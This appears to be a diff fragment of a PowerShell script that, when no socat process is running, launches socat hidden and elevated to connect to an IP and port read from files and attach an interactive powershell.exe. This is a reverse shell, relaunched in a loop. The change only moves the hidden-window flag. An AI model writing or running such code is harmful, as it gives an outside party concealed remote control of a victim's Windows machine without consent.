@@ -20,7 +20,7 @@ if(Get-Process -Name socat){
 	
 }else{
 
-	Start-Process powershell.exe -Verb runAs -FilePath 'powershell.exe -windowstyle hidden .\socat -d -d TCP4:${Ip}:${Port} EXEC:'powershell.exe',pipes'	
+	Start-Process powershell.exe -Verb runAs -windowstyle hidden -FilePath 'socat -d -d TCP4:${Ip}:${Port} EXEC:'powershell.exe',pipes'	
 
 }
 '@)
@@ -32,5 +32,3 @@ $Port = Get-Content portnumber
 Invoke-Command -ScriptBlock $scriptBlock
 Start-Sleep -Seconds 10
 }
-
-
